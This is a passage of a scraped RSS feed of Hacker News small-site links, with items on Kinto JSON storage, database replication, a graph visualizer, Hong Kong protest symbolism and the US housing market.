<div><!--HubSpot Call-to-Action Code --><p><span id="hs-cta-wrapper-f33b2069-3350-40ff-bb1f-8570d0f9691e"><span id="hs-cta-f33b2069-3350-40ff-bb1f-8570d0f9691e"><!--[if lte IE 8]><div id="hs-cta-ie-element"></div><![endif]--><a href="https://cta-redirect.hubspot.com/cta/redirect/6960697/f33b2069-3350-40ff-bb1f-8570d0f9691e"><img id="hs-cta-img-f33b2069-3350-40ff-bb1f-8570d0f9691e" src="https://no-cache.hubspot.com/cta/default/6960697/f33b2069-3350-40ff-bb1f-8570d0f9691e.png" alt="Contact Us"></a></span></span></p><!-- end HubSpot Call-to-Action Code --></div></span></p><p><label>app development</label></p>
        
      </div></div>]]>
            </description>
            <link>https://blog.snappymob.com/proof-of-concept-prototype-and-mvp-the-purpose-the-audience-and-the-benefits</link>
            <guid isPermaLink="false">hacker-news-small-sites-25575275</guid>
            <pubDate>Tue, 29 Dec 2020 21:28:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Kinto, minimalist JSON storage with synchronisation and sharing abilities]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25574992">thread link</a>) | @ofrzeta
<br/>
December 29, 2020 | https://docs.kinto-storage.org/en/latest/index.html | <a href="https://web.archive.org/web/*/https://docs.kinto-storage.org/en/latest/index.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="toc">
    <div>
          <h3><a href="https://docs.kinto-storage.org/en/latest/overview.html">Overview</a></h3>
          <p>A high-level introduction of what Kinto is.</p>
          <p><a href="https://docs.kinto-storage.org/en/latest/overview.html#use-cases">Use cases</a> | <a href="https://docs.kinto-storage.org/en/latest/faq.html#comparison">Comparison table</a> | <a href="https://docs.kinto-storage.org/en/latest/faq.html">FAQ</a></p>
    </div>
    <div>
        <h3><a href="https://docs.kinto-storage.org/en/latest/concepts.html">Concepts</a></h3>
        <p>Dive into the details: architecture and terminology.</p>
        <p><a href="https://docs.kinto-storage.org/en/latest/concepts.html#buckets-collections-and-records">Buckets, Collections and Records</a> | <a href="https://docs.kinto-storage.org/en/latest/concepts.html#inherited">Permissions inheritance</a> | <a href="https://docs.kinto-storage.org/en/latest/concepts.html#groups">Groups</a></p>
    </div>
    <div>
        <h3><a href="https://docs.kinto-storage.org/en/latest/community.html">Community &amp; Support</a></h3>
        <p>Get help, contribute, and troubleshoot.</p>
        <p><a href="https://docs.kinto-storage.org/en/latest/community.html#how-to-contribute">How to contribute</a> | <a href="https://docs.kinto-storage.org/en/latest/community.html#communication-channels">Communication channels</a> | <a href="https://docs.kinto-storage.org/en/latest/community.html#hack">Hack</a> | <a href="https://docs.kinto-storage.org/en/latest/community.html#troubleshooting">Troubleshooting</a></p>
    </div>
    <div>
        <h3><a href="https://docs.kinto-storage.org/en/latest/tutorials/index.html">Tutorials</a></h3>
        <p>Some guides to discover Kinto features.</p>
        <p><a href="https://docs.kinto-storage.org/en/latest/tutorials/install.html">Install Kinto</a> | <a href="https://docs.kinto-storage.org/en/latest/tutorials/first-steps.html">Discover the API</a> |  <a href="https://docs.kinto-storage.org/en/latest/tutorials/app-examples.html">Application examples</a></p>
    </div>
    <div>
        <h3><a href="https://docs.kinto-storage.org/en/latest/configuration/settings.html">Configuration</a></h3>
        <p>Install, configure, and deploy.</p>
        <p><a href="https://docs.kinto-storage.org/en/latest/configuration/settings.html">Settings</a> | <a href="https://docs.kinto-storage.org/en/latest/configuration/production.html">Production setup</a> | <a href="https://docs.kinto-storage.org/en/latest/configuration/good-practices.html">Good practices</a></p>
    </div>
    <div>
        <h3><a href="https://docs.kinto-storage.org/en/latest/api/index.html">APIs</a></h3>
        <p>An exhaustive look at the exposed HTTP endpoints.</p>
        <p><a href="https://docs.kinto-storage.org/en/latest/api/index.html#cheatsheet">Cheatsheet</a> | <a href="https://docs.kinto-storage.org/en/latest/api/index.html#full-reference">Full reference</a> | <a href="https://docs.kinto-storage.org/en/latest/api/1.x/permissions.html#permissions">Permissions</a> | <a href="https://docs.kinto-storage.org/en/latest/api/1.x/synchronisation.html">Synchronisation</a></p>
    </div>
</div></div>]]>
            </description>
            <link>https://docs.kinto-storage.org/en/latest/index.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25574992</guid>
            <pubDate>Tue, 29 Dec 2020 21:04:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Primer on Database Replication]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25574871">thread link</a>) | @nutmilk
<br/>
December 29, 2020 | https://blog.arctype.com/a-primer-on-database-replication/ | <a href="https://web.archive.org/web/*/https://blog.arctype.com/a-primer-on-database-replication/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                <p>By Brian Storti. </p><p><em>Originally published on Brian Storti's <a href="https://www.brianstorti.com/replication/">blog</a>. </em></p><p>Replicating a database can make our applications faster and increase our tolerance to failures, but there are a lot of different options available and each one comes with a price tag. It’s hard to make the right choice if we do not understand how the tools we are using work, and what are the guarantees they provide (or, more importantly, do <em>not</em> provide), and that’s what I want to explore here.</p><h4 id="before-we-start-some-background">Before we start, some background</h4><p>My workplace has offices in North America, Europe and Asia and is rapidly expanding. People working in these 3 continents rely heavily on the tools that we build to do their job, so any performance issue has a big impact in their work. As the number of people using our systems increased our database started to feel the pressure. Initially we could just keep increasing our database server capacity, getting a more powerful machine, adding more RAM, and keep scaling vertically, but there is one problem that we cannot solve, unfortunately: The limit of the speed of light.</p><blockquote><em><em>Light travels with a speed of 299,792 km/s in a vacuum. Even if we assume that our requests are traveling at this speed, and that they travel in a straight line, it would still take 133ms for a round the world trip. In reality, our requests will be slower than the speed of light and there will be a lot of zig zag from one hop to another until they reach their destination.</em></em></blockquote><figure><img src="https://www.brianstorti.com/assets/images/replication/ping-table.png" alt=""></figure><p>No matter how quickly we can <em>execute</em> a query, if the database is in North America, the data still needs to travel all the way to Asia before people in that office can use it. It was clear that we had to make that data available somewhere closer to them, and so the quest began.</p><p>Researching all the available options and everything that is involved in a database replication setup can be overwhelming, there are literally decades of literature about the subject, and after you start digging it’s hard to see the end.</p><p>I am by no means a replication expert, but during this process I learned a thing or two, and that’s what I want to share here. This is not supposed to be an extensive resource to learn everything there is to know about replication, but hopefully it’s a good starting point that you can use in your own journey. In the end of this article I will link to some great resources that can be helpful if you decide to learn more.</p><p>Sounds good? Cool, grab a cup of coffee and let’s have fun.</p><h3 id="first-things-first-the-what-and-the-why">First things first, the what and the why</h3><p>Just to make sure we are on the same page, let’s define what replication is and describe the three main reasons why we might want it.</p><p>When we say we want to replicate something, it means we want to keep a copy of the same data in multiple places. In the case of databases, that can mean a copy of the entire database, which is the most common scenario, or just some parts of it (e.g. a set of tables). These multiple locations where we will keep the data are usually connected by a network, and that’s the origin of most of our headaches, as you will see in a bit.</p><p>The reason for wanting that will be one or more of the following:</p><ul><li>You want to keep the data closer to your users so you can save the travel time. Remember, no matter how fast your database is, the data still needs to travel from the computer that started the request to the server where the database is, and then back again. You can optimize the heck out of your database, but you cannot optimize the laws of physics.</li><li>You want to scale the number of machines serving requests. At some point a single server will not be able to handle the number of clients it needs to serve. In that case, having several databases with the same data helps you serve more clients. That’s what we call scaling <em>horizontally</em> (as opposed to <em>vertically</em>, which means having a more powerful machine).</li><li>You want to be safe in case of failures (that will happen). Imagine you have your data in single database server and that server catches fire, then what happens? I am sure you have some sort of backup (right?!), but your backup will a) take some time to be restored and b) probably be <em>at least</em> a couple of hours old. Not cool. Having a replica means you can just start sending your requests to this server while you are solving the fire situation, and maybe no one will even notice that something bad happened.</li></ul><h4 id="the-obligatory-cap-introduction">The obligatory CAP introduction</h4><p>The CAP theorem was introduced by Eric Brewer in the year 2000, so it’s not a new idea. The acronym stands for <code>C</code>onsistency, <code>A</code>vailability and <code>P</code>artition Tolerance, and it basically says that, given these 3 properties in a distributed system, you need to choose 2 of them (i.e. you cannot have all 3). In practice, it means you need to choose between consistency and availability when an inevitable partition happens. If this sounds confusing, let me briefly define what these 3 terms mean, and why I am even talking about this here.</p><figure><img src="https://www.brianstorti.com/assets/images/replication/cap.png" alt=""></figure><p><strong><strong>Consistency</strong></strong>: In the CAP definition, consistency means that all the nodes in a cluster (e.g. all your database servers, leaders and replicas) see the same data at any given point in time. In practice, it means that if you query any of your database servers at the exact same time, you will get the same result back.</p><blockquote><em><em>Notice that this is completely unrelated to the ‘Consistency’ from the <a href="https://en.wikipedia.org/wiki/Consistency_(database_systems)#As_an_ACID_guarantee">ACID</a> properties.</em></em></blockquote><p><strong><strong>Availability</strong></strong>: It means that reads and writes will always succeed, even if we cannot guarantee that it will have the most recent data. In practice, it means that we will still be able to use one of our databases, even when it cannot talk to the others, and therefore might not have received the latest updates.</p><p><strong><strong>Partition Tolerance</strong></strong>: This means that your system will continue working even if there is a network partition. A network partition means that the nodes in your cluster cannot talk to each other.</p><figure><img src="https://www.brianstorti.com/assets/images/replication/network-partition.png" alt=""></figure><p>And why am I talking about this? Well, because depending on the route you take you will have different trade-offs, sometimes favoring consistency and sometimes availability.</p><p>How valuable the CAP theorem is in the distributed systems discussions is debatable, but I think it is useful to keep in mind that you are almost always trading consistency for availability (and vice-versa) when dealing with network partitions.</p><h4 id="a-word-about-latency">A word about latency</h4><p><em>Latency</em> is the time that a request is waiting to be handled (it’s <em>latent</em>). Our goal is to have the lowest latency possible. Of course, even with a low latency we can still have a high <em>response time</em> (if a query takes a long time to run, for example), but that’s a different problem.</p><p>When we replicate our database we can decrease the latency by shortening the distance this request needs to travel and/or increasing our capacity, so the request doesn’t need to wait before it can be handled due to a busy server.</p><p>I’m just mentioning this here because I think it’s very important to be sure that the reason why we are experiencing high response times is really because the latency is high, otherwise we may be solving the wrong problem.</p><h4 id="asynchronous-replication">Asynchronous replication</h4><p>When we talk about replication, we are basically saying that when I write some data in a given node <code>A</code>, this same data also needs to be written in node <code>B</code> (and maybe <code>C</code> and <code>D</code> and <code>E</code> and…), but we need to decide <em>how</em> this replication will happen, and what are the guarantees that we need. As always, it’s all about trade-offs. Let’s explore our options.</p><p>The first option is to be happy to send a confirmation back to the client as soon as the node that received the message has successfully written the data, and <em>then</em> send this message to the replicas (that may or may not be alive). It works somewhat like this:</p><figure><img src="https://www.brianstorti.com/assets/images/replication/async.png" alt=""></figure><p>This looks great, we don’t notice any performance impact as the replication happens in the background, after we already got a response, and if the replica is dead or slow we won’t even notice it, as the data was already sent back to the client. Life is good.</p><p>There are (at least) two main issues with asynchronous replication. The first is that we are weakening our durability guarantees, and the other is that we are exposed to replication lags. We will talk about replication lag later, let’s focus on the durability issue first.</p><p>Our problem here is that if the node that received this write request fails before it can replicate this change to the replicas, the data is lost, even though we sent a confirmation to the client.</p><figure><img src="https://www.brianstorti.com/assets/images/replication/async_failure.png" alt=""></figure><p>You may be asking yourself</p><blockquote><em><em>“But what are the chances of a failure happening right at THAT moment?!”</em></em></blockquote><p>If that’s the case, I’ll suggest that you instead ask</p><blockquote><em><em>“What are the <em>consequences</em> if a failure happens at that moment?”</em></em></blockquote><p>Yes, it may be totally fine to take the risk, but in the classic example of dealing with financial transactions, maybe it’s better to pay the price to have stronger guarantees. But what is the price?</p><h4 id="synchronous-replication">Synchronous replication</h4><p>As you might expect, synchronous replication basically means that we will <em>first</em> replicate the data, and then send a confirmation to the client.</p><figure><img src="https://www.brianstorti.com/assets/images/replication/sync.png" alt=""></figure><p>So when the client gets the confirmation we can be sure that the data is replicated and safe (well, it’s never 100% safe, all of our data centers can, in theory, explode at the same time, but it’s safe enough).</p><p>The price we need to pay is: Performance and availability.</p><p>The performance penalty is due to the fact that we need to <em>wait</em> for these - potentially - slow replicas to do their thing and send us a confirmation before we can tell the client that everything is going to be fine. As these replicas are usually distributed geographically, and potentially very far from each other, this takes more time than we would like to wait.</p><p>The second issue is availability. If one of the replicas (remember, we can have many!) is down or we cannot reach it for some reason, we simply cannot write any data. You should always plan for failures, and network partitions are more common than we imagine, so depending on <em>all</em> replicas being reachable to perform any write doesn’t seem like a great idea to me (but maybe it is for your specific case).</p><h4 id="not-8-not-80">Not 8, not 80</h4><p>There’s some middle ground. Some …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.arctype.com/a-primer-on-database-replication/">https://blog.arctype.com/a-primer-on-database-replication/</a></em></p>]]>
            </description>
            <link>https://blog.arctype.com/a-primer-on-database-replication/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25574871</guid>
            <pubDate>Tue, 29 Dec 2020 20:54:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Graph Toy, an interactive graph visualizer using mathematical functions]]>
            </title>
            <description>
<![CDATA[
Score 160 | Comments 24 (<a href="https://news.ycombinator.com/item?id=25574661">thread link</a>) | @netule
<br/>
December 29, 2020 | http://memorystomp.com/graphtoy/ | <a href="https://web.archive.org/web/*/http://memorystomp.com/graphtoy/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://memorystomp.com/graphtoy/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25574661</guid>
            <pubDate>Tue, 29 Dec 2020 20:40:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Owl’s Right Eye (2019)]]>
            </title>
            <description>
<![CDATA[
Score 117 | Comments 22 (<a href="https://news.ycombinator.com/item?id=25574623">thread link</a>) | @paulorlando
<br/>
December 29, 2020 | https://unintendedconsequenc.es/the-owls-right-eye/ | <a href="https://web.archive.org/web/*/https://unintendedconsequenc.es/the-owls-right-eye/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-1487">
		<!-- .entry-header -->

	
	<div>
		<p>Let’s come back, more directly, to a theme in my writing — what happens when something small becomes a tipping point for change. <strong>When the seemingly innocuous becomes unpredictable.</strong></p>
<p>If you’ve only casually followed the <a href="https://unintendedconsequenc.es/why-are-there-so-many-protests-in-hong-kong/">Hong Kong protests</a> and reaction from the Chinese mainland and overseas Chinese communities, you might wonder about the importance and meaning of the covered eye. Specifically, the right eye.</p>
<p>Hong Kong protesters found one of their many symbols (and there are many) when police shot and injured the right eye of a protesting woman in August. The injured eye is a more powerful symbol than even that of the man police shot on October 1 (Chinese National Day) in the chest (that is, <em>the heart</em>).</p>
<p>But since the now famous protester’s eye injury we’ve seen company ad campaign apologies and even an individual arrest all because of missing eyes.</p>
<p>But the eye I was reminded of was none of these. It was a different eye — also a right eye and in China — that over 40 years ago had results reminiscent to those eyes of today.</p>

<p>If you are a student of Chinese Cultural Revolution artwork, you might recognize this painting of an owl by Huang Yongyu.</p>
<p><img loading="lazy" src="https://unintendedconsequenc.es/wp-content/uploads/2019/10/Huang-Yongyu-Owl.jpg" alt="Huang Yongyu's owl with one closed eye" width="400" height="607" srcset="https://unintendedconsequenc.es/wp-content/uploads/2019/10/Huang-Yongyu-Owl.jpg 300w, https://unintendedconsequenc.es/wp-content/uploads/2019/10/Huang-Yongyu-Owl-198x300.jpg 198w" sizes="(max-width: 400px) 100vw, 400px"></p>
<p>Huang served three and a half years in a labor camp for it.</p>
<p>The <a href="https://www.wikiart.org/en/huang-yongyu/owl-1973">painting was interpreted</a> as a “portrayal of public officials turning a blind eye to wrong doings.” It’s not clear if he meant it as such.</p>
<p>Huang’s owl was one of many works of art gathered for a “black painting” (meaning counter-revolutionary) <a href="https://publishing.cdlib.org/ucpressebooks/view?docId=ft6w1007nt&amp;chunk.id=d0e11683&amp;toc.id=d0e10324&amp;toc.depth=100&amp;brand=ucpress&amp;anchor.id=bkd0e11803#X">exhibition and criticism</a> meeting in the 1970s. In some cases, officials had to scrounge around to find more “black painters” to have enough art to criticize. If you read some of the art descriptions, it seems like at least some of the artists were just unlucky rather than counter-revolutionary.</p>
<p>And while I haven’t seen anyone publicly connect Huang’s winking owl with the protests of today, I imagine people with longer memories think about it.</p>
<p>Next in chronology we have of course the event from this summer in Hong Kong. A woman attending a protest was shot in her right eye. Covering one’s <a href="https://www.thelily.com/an-eye-for-an-eye-how-one-womans-eye-patch-became-the-symbol-of-the-hong-kong-protests/">right eye</a> soon became a symbol.</p>
<figure id="attachment_1496" aria-describedby="caption-attachment-1496"><img loading="lazy" src="https://unintendedconsequenc.es/wp-content/uploads/2019/10/Hong-Kong-eye-e1572126020800.png" alt="Covering the right eye" width="600" height="309"><figcaption id="caption-attachment-1496">from <a href="https://www.washingtonpost.com/world/2019/08/13/how-bloody-eye-patches-became-latest-symbol-escalating-hong-kong-protests/">Washington Post</a> article</figcaption></figure>
<p>And as a good symbol, it is impossible to ignore (you can’t look away from someone’s eyes and still talk). As a good symbol it also brings the eye-patch wearers themselves into some discomfort.</p>
<p>The eye symbol became even better known when a foreign company felt pressure to remove and apologize for an old ad that predated the Hong Kong protests, but which happened to include a covered right eye.</p>
<p>Here’s a <a href="https://www.pinterest.com/pin/742601426037240952/">Tiffany ad</a> (since removed) that pre-dates the protests.</p>
<p><img loading="lazy" src="https://unintendedconsequenc.es/wp-content/uploads/2019/10/Tiffany-eye-1.jpg" alt="Tiffany ad - one covered eye" width="474" height="554" srcset="https://unintendedconsequenc.es/wp-content/uploads/2019/10/Tiffany-eye-1.jpg 474w, https://unintendedconsequenc.es/wp-content/uploads/2019/10/Tiffany-eye-1-257x300.jpg 257w" sizes="(max-width: 474px) 100vw, 474px"></p>
<p>And here’s <a href="https://www.hongkongfp.com/2019/10/08/tiffany-removes-advert-hong-kong-controversy/">another Tiffany ad</a>, also removed following complaints to the company for stirring up social disorder.</p>
<p><img loading="lazy" src="https://unintendedconsequenc.es/wp-content/uploads/2019/10/Tiffany-eye-2-1024x532.jpg" alt="Tiffany ad - covered right eye" width="525" height="273" srcset="https://unintendedconsequenc.es/wp-content/uploads/2019/10/Tiffany-eye-2-1024x532.jpg 1024w, https://unintendedconsequenc.es/wp-content/uploads/2019/10/Tiffany-eye-2-300x156.jpg 300w, https://unintendedconsequenc.es/wp-content/uploads/2019/10/Tiffany-eye-2-768x399.jpg 768w, https://unintendedconsequenc.es/wp-content/uploads/2019/10/Tiffany-eye-2.jpg 1050w" sizes="(max-width: 525px) 100vw, 525px"></p>
<p>And to compare, here’s another picture of Sun Feifei (the same model in the second Tiffany ad) covering her right eye in another photo shoot, also months before the protests in Hong Kong. And actually shown on a <a href="http://www.china.org.cn/photos/2010-04/20/content_19863707.htm">government-run website, even today</a>.</p>
<p><img loading="lazy" src="https://unintendedconsequenc.es/wp-content/uploads/2019/10/Sun-Feifei-eye.jpg" alt="Tiffany model covering her right eye" width="400" height="600" srcset="https://unintendedconsequenc.es/wp-content/uploads/2019/10/Sun-Feifei-eye.jpg 400w, https://unintendedconsequenc.es/wp-content/uploads/2019/10/Sun-Feifei-eye-200x300.jpg 200w" sizes="(max-width: 400px) 100vw, 400px"></p>
<p>So eye covering can look like a matter of intent. The china.org.cn right eye picture can obviously have no connection to the Hong Kong protests. But a foreign company is different, even with ads shot months before the covered eye became a protest symbol.</p>
<p>Of course, the covered eye — again, the right eye — has been used famously before in an ad campaign: “The Man in the Hathaway Shirt.”</p>
<p><img loading="lazy" src="https://unintendedconsequenc.es/wp-content/uploads/2019/10/hathaway-shirt-595x800.jpg" alt="Man in the Hathaway shirt" width="525" height="706" srcset="https://unintendedconsequenc.es/wp-content/uploads/2019/10/hathaway-shirt-595x800.jpg 595w, https://unintendedconsequenc.es/wp-content/uploads/2019/10/hathaway-shirt-223x300.jpg 223w, https://unintendedconsequenc.es/wp-content/uploads/2019/10/hathaway-shirt.jpg 645w" sizes="(max-width: 525px) 100vw, 525px"></p>
<p>No political meaning. Just an Ogilvy ad with the eyepatch used as a gimmick.</p>
<p>But there’s more again.</p>
<p>A <a href="https://shanghaiist.com/2019/10/08/houston-rockets-fan-detained-for-posting-photo-of-himself-about-to-burn-chinese-flag/">Houston Rockets fan in China</a> (the same team whose manager posted a “Stand with Hong Kong” tweet) was much too cynical on the ability of his government to track him down.</p>
<p>The first line (after the hashtag) says: “I live and die with my team.” The second line: “Come and catch me.”</p>
<p><img loading="lazy" src="https://unintendedconsequenc.es/wp-content/uploads/2019/10/rockets-fan-arrest-1024x546.jpg" alt="Covered right eye, now in jail" width="525" height="280" srcset="https://unintendedconsequenc.es/wp-content/uploads/2019/10/rockets-fan-arrest.jpg 1024w, https://unintendedconsequenc.es/wp-content/uploads/2019/10/rockets-fan-arrest-300x160.jpg 300w, https://unintendedconsequenc.es/wp-content/uploads/2019/10/rockets-fan-arrest-768x410.jpg 768w" sizes="(max-width: 525px) 100vw, 525px"></p>
<p>They caught him, just a few hours later. And it appears he covered an eye to make facial identification more difficult. But again, what if he hadn’t covered his eye?</p>
<p>The apology from Tiffany strikes an international audience as the exportation of anti-protester values. The above picture of the NBA fan chained in a “tiger chair” strikes an international audience as not the future they want for themselves. <strong>Has the visual symbol of the eye — uncontrollable once the injury and advertisements happened — helped spread this message further?</strong></p>
<h2>Wearing of Masks</h2>
<p>Should protesters anywhere be allowed to wear masks? While a number of US states already had <a href="https://www.bostonglobe.com/metro/2019/10/22/boston-and-hong-kong-debate-over-masks/JYajFCkul7UMw7PaXyZ5vL/story.html">mask bans in public spaces</a>, general public opinion seemed even more in support of the bans after a number of mask wearing Antifa members beat up a reporter in Portland earlier this year. The argument against masks was that covering one’s face minimize the feeling of social disapproval and led to worse behavior.</p>
<p>The US has at times overturned mask bans, famously after the Iranian Revolution as a way to protect Iranian protesters in California. But those masked were protesting a government from which they had fled to the US. It’s a different story when the protesters are domestic.</p>
<p>But a different explanation emerged in the Hong Kong protests now that we have <a href="https://unintendedconsequenc.es/emergence-of-omniscience-part-1-images/">identity at scale</a>. Protesters had already taken cautions to avoid identification by using single-use MTR (metro) transit cards and paying in cash. But faces could be identified at scale either live or in the near future by capturing records of protest attendance, assessing behavior, and following up with repercussions.</p>
<p>Hong Kong protesters also try to take down eyes on the crowd in the form of smart lampposts. There are a number of videos of them <a href="https://www.hongkongfp.com/2019/08/24/tear-gas-kwun-tong-hong-kong-protesters-surround-police-station-dismantle-surveillance-lampposts/">dismantling these lampposts</a> out of fear of surveillance.</p>
<p>For me it’s interesting to reflect on the news from Hong Kong because Hong Kong is a place I have visited over almost 30 years. During that time, I also lived there for around six years. Five of the visits and about one year of the living there was pre-Handover. In the time leading up to 1997, I observed (can’t really say I demonstrated) in a few events. These fell into a few types:</p>
<ul>
<li>Marches, often along Queen’s Road, in crowds in the tens of thousands or hundreds of thousands.</li>
<li>Sit-down demonstrations outside of the New China News Agency (the NCNA was the de facto Chinese embassy pre-Handover).</li>
<li>June 4th remembrances in Victoria Park (including the last pre-Handover one), often culminating in the crowd holding lit candles. <a href="https://www.youtube.com/watch?v=kYwsPt854Xo">Cui Jian’s <em>Nothing To My Name</em></a> would always be played (a song popular at 1989 Tiananmen).</li>
</ul>
<p>No one wore a mask, because there wasn’t any need to do so. The protest leaders were already known. The crowd was safe in numbers. I never heard anyone fear identification, even post-Handover.</p>
<p>If you contrast the protesters of back then with those of the last six months, they are unrecognizable.</p>
<p>That protesters hide their faces and cut down smart lampposts makes sense. Like the eyes in the advertisements above, the lampposts may not have any intent to use facial recognition to identify protesters, but there is no trust. Anything can look suspicious. If the capability is there to help your adversary, then you assume they use it. Especially if there are examples of mass surveillance already in place, for example in the Chinese province of <a href="https://unintendedconsequenc.es/uyghurs-xinjiang-onward-to-the-inevitable/">Xinjiang</a>.</p>
<h2>Consider</h2>
<ul>
<li>Identity at scale can weaken trust.</li>
<li>Visual symbols can spread a message.</li>
<li>Huang Yongyu’s owl paintings now sell at auction.</li>
</ul>
<!-- Begin Mailchimp Signup Form -->




<!--End mc_embed_signup-->	</div><!-- .entry-content -->

	 <!-- .entry-footer -->
</article></div>]]>
            </description>
            <link>https://unintendedconsequenc.es/the-owls-right-eye/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25574623</guid>
            <pubDate>Tue, 29 Dec 2020 20:38:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The housing market isn’t “broken:” it’s working perfectly as designed]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25574525">thread link</a>) | @jseliger
<br/>
December 29, 2020 | https://blokable.com/news/housing-market-isnt-broken-its-working-perfectly/ | <a href="https://web.archive.org/web/*/https://blokable.com/news/housing-market-isnt-broken-its-working-perfectly/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div>
<h2><strong>By Nelson del Rio and Aaron Holm,<br>Co-CEOs, Blokable Inc.</strong></h2>

<h2>The following post examines the current housing market in the first of a series exploring the root causes of the American housing crisis and how public-private collaboration can chart a different course.</h2>

<div><figure><img width="1055" height="800" src="data:image/svg+xml;base64,PHN2ZyB2aWV3Qm94PSIwIDAgMjA0OCAxNTUzIiB3aWR0aD0iMjA0OCIgaGVpZ2h0PSIxNTUzIiBkYXRhLXU9IiUyRndwLWNvbnRlbnQlMkZ1cGxvYWRzJTJGMjAyMCUyRjA5JTJGdXJiYW4tc3ByYXdsLTIwNDh4MTU1My5qcGciIGRhdGEtdz0iMjA0OCIgZGF0YS1oPSIxNTUzIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjwvc3ZnPg==" data-spai="1" alt="" sizes="(max-width: 1055px) 100vw, 1055px"></figure></div>

<p>Housing is integral to social justice and economic opportunity, and it is the foundation for education and public health. In the U.S. the public sector regulates, enforces, and in some cases delivers housing in an attempt to uphold shared values and standards, address community needs, and drive economic prosperity. Over the past 20 years federal, state, and local governments have spent billions of dollars to provide housing stability to the under-served. Despite these efforts, access and affordability in the U.S. housing market have fallen sharply over time, and are likely to decline further amid the coronavirus pandemic and recession.</p>
<p>Even before Covid-19, the housing crisis threatened the economic prospects of an increasing number of Americans. Tragically, the impacts of housing shortages are felt most sharply at the lower rungs of the income ladder; for every 100 extremely low-income households, there are only 36 affordable rental homes on the housing market. Housing instability affects an ever-greater number of Americans — not only the <a href="https://www.census.gov/library/publications/2019/demo/p60-266.html#:~:text=In%202018%2C%20there%20were%2038.1,17.4%20percent%20to%2016.2%20percent." target="_blank" rel="noopener">38 million people who live in poverty as of 2018</a>, but the 38 million “cost-burdened” households who spend more than 30 percent of their income on housing, and the millions more who survive paycheck to paycheck.&nbsp;</p>
<p>Public officials across the country have discovered that no amount of housing subsidy can incentivize the market to work for the benefit of their communities, or meaningfully address the housing challenges they face. As the nation grapples with simultaneous public health and economic crises, improving housing access and affordability means getting down to brass tacks.&nbsp;</p>
<p>Can a free market ever provide all of the housing needed in our society? Why is it that the public and private sectors are unable to achieve efficiency and fairness? The answer lies in the structure of the housing market and the housing development process itself.&nbsp;</p>
<p>The housing industry evolved from a local activity where land was abundant and neighbors worked together to build homes, to a land-constrained environment with a highly specialized and regulated industry. The permanent, physical nature of real estate combined with local health and safety regulations have shaped a housing industry that develops, finances, designs, and builds one project at a time, with all construction work done on site by local contractors. Architects, developers, financial institutions, contractors, and others compete to maximize profit and minimize risk in housing creation.&nbsp;</p>

<div><figure><img src="data:image/svg+xml;base64,PHN2ZyB2aWV3Qm94PSIwIDAgMTIzMCA3ODUiIHdpZHRoPSIxMjMwIiBoZWlnaHQ9Ijc4NSIgZGF0YS11PSIlMkZ3cC1jb250ZW50JTJGdXBsb2FkcyUyRjIwMjAlMkYwOSUyRmltYWdlMDAyLTEucG5nIiBkYXRhLXc9IjEyMzAiIGRhdGEtaD0iNzg1IiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjwvc3ZnPg==" data-spai="1" alt="" width="677" height="432" sizes="(max-width: 677px) 100vw, 677px"><figcaption><em>Competing and fragmented interests are strangling the housing market.</em></figcaption></figure></div>
<p>Housing development is generally divided into market rate projects, financed by the promise of future renters paying full price, and so-called “affordable” projects, which rely on&nbsp; government subsidy to produce a home that is attainable at below-market rent. Yet market rate and affordable housing developers must work with the same available land and the same pool of industry participants — architects, engineers, contractors, etc. — to build their projects at the same industry rates. Affordable housing is actually more expensive to produce than market rate because the developer must pay additional costs associated with obtaining public subsidies and managing legal and financial compliance. Amid soaring demand in growing urban areas, per-door build costs for affordable apartments now range from $500K to $1M.&nbsp;</p>
<p>The implications are alarming. First, the industry is supply-constrained and can build only a fraction of the housing needed to meet demand in fast-growing areas such as Los Angeles and the Bay Area.&nbsp;Second, supply constraints mean higher building costs and a strong incentive for the industry to produce for the highest end of the housing market: luxury housing. Third, whether it’s private capital or public subsidy, the more money available to build housing in a given market, the higher the cost for this scarce resource.&nbsp;</p>
<p>Many believe that construction innovations such as modular construction and panelized building systems save time and money, thus providing a solution to the upward spiral in housing costs. But traditional modular builders are wedded to the incentives of the real estate market. They have their own labor and material costs, profit requirements, and competitive pressures. Modular firms match their prices with conventional offerings like on-site framing and tout the speed advantage of modular technology, while their developer and general contractor customers simply pocket any savings that result. Rather than making housing more affordable, modular technology has functioned as a replacement input into an industry that historically has invested next to nothing in research and development.&nbsp;</p>
<p>Moreover, competition among modular providers actually discourages housing innovation, as a glut of commodity-priced modular solutions race to build the lowest quality product at the highest possible price. In our new era of Net Zero, climate resilient, and public health conscious development, this is no room for a race to the bottom in efficiency, performance, and durability.&nbsp;</p>
<p>Contrary to popular and convenient opinion, the current housing market isn’t broken, it’s working perfectly as&nbsp;designed and in a very efficient manner. No one in this business will innovate to disrupt themselves. And if all the money in the world won’t fix housing, then perhaps we shouldn’t be trying to fix it at all. Perhaps we need to create <a href="https://blokable.com/solution/">a new housing paradigm</a> that leverages innovation to drive down costs, reduces the need for subsidies, and creates new wealth.</p>
</div>
</div></div>]]>
            </description>
